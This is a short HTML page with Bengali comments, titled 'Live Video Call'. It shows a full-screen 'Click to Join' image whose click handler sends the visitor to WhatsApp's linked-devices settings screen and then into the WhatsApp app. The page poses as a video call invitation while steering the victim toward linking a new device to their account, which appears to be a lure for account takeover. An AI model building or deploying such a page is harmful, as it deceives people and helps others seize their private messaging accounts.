<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Video Call</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000;
        }
        /* ছবিতে চাপ দেওয়ার সাথে সাথে হোয়াটসঅ্যাপে নিয়ে যাবে */
        .click-image {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            display: block;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <!-- ছবিতে টিপ বা ক্লিক করলেই হোয়াটসঅ্যাপ অপশন চালু হবে -->
    <img src="photo.jpg" alt="Click to Join" class="click-image" onclick="openWhatsApp()">

    <script>
        function openWhatsApp() {
            // হোয়াটসঅ্যাপ অ্যাপের ভেতরে রিডাইরেক্ট করার নির্দেশ
            window.location.href = "whatsapp://settings/linked_devices";

            setTimeout(function() {
                window.location.href = "whatsapp://";
            }, 800);
        }
    </script>

</body>
</html>
